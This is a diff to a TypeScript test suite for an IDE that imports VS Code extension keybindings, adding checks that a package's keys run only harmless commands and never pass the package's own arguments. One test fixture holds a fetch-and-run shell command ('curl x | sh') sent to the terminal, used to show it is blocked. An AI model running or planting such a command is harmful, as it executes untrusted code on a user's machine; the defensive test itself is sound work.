@@ -84,6 +84,7 @@ const IDE_COMMANDS = new Set([
 
 const targets = (extra: Partial<KeybindingTargets> = {}): KeybindingTargets => ({
   has: (id) => IDE_COMMANDS.has(id),
+  harmless: () => false,
   declaredElsewhere: () => undefined,
   ...extra,
 });
@@ -171,9 +172,10 @@ test("ms-python: code-registered commands go through its hidden command, others 
     when: "isCompositeNotebook && activeEditor == 'workbench.editor.repl'",
     args: { id: "python.execInREPLEnter", arguments: [], resolve: true },
   });
-  // Another extension's declared command: its dispatcher id, VS Code's argument kept.
+  // Another extension's declared command: its dispatcher id, without the rule's arguments (a
+  // key runs as the user: what it passes to another's command isn't the package's to choose).
   assert.deepEqual(out[2]?.command, "jupyter.runCurrentCell");
-  assert.deepEqual(out[2]?.args, { arguments: [{ x: 1 }] });
+  assert.deepEqual(out[2]?.args, { arguments: [] });
   // A removal of VS Code's own command removes the IDE's binding of it.
   assert.deepEqual(out[3], { key: "shift+alt+f", command: "-editor.runAction" });
   assert.equal(out.length, 4);
@@ -441,4 +443,38 @@ test("audit: a keybinding whose key can't be read is skipped with a warning", ()
   assert.equal(warnings.length, 2);
   assert.match(warnings[0] ?? "", /"ctrl\+shift\+".*can't read the key/);
   assert.match(warnings[1] ?? "", /macOS/);
+});
+
+test("audit: a package's key runs an IDE command by its id only when it's harmless, without args", () => {
+  const m = parseManifest(
+    {
+      name: "pretty-theme",
+      publisher: "acme",
+      version: "1.0.0",
+      contributes: {
+        keybindings: [
+          { key: "ctrl+s", command: "terminal.sendText", args: { text: "curl x | sh" } },
+          { key: "ctrl+alt+o", command: "outline.show", args: { anything: true } },
+          { key: "ctrl+alt+s", command: "workbench.action.files.save", args: { path: "/x" } },
+          { key: "ctrl+alt+t", command: "-terminal.sendText" },
+        ],
+      },
+    },
+    "package.json",
+  );
+  const ide = new Set(["terminal.sendText", "outline.show", "editor.save"]);
+  const { rules: out, warnings } = resolveVscodeKeybindings(m.contributes.keybindings, {
+    has: (id) => ide.has(id),
+    harmless: (id) => id === "outline.show",
+    declaredElsewhere: () => undefined,
+  });
+  assert.deepEqual(out, [
+    { key: "ctrl+alt+o", command: "outline.show" },
+    // VS Code's id: the IDE's own mapping, never the package's arguments.
+    { key: "ctrl+alt+s", command: "editor.save" },
+    // Taking a key away from a command runs nothing.
+    { key: "ctrl+alt+t", command: "-terminal.sendText" },
+  ]);
+  assert.equal(warnings.length, 1);
+  assert.match(warnings[0] ?? "", /ctrl\+s \(terminal\.sendText\) skipped/);
 });
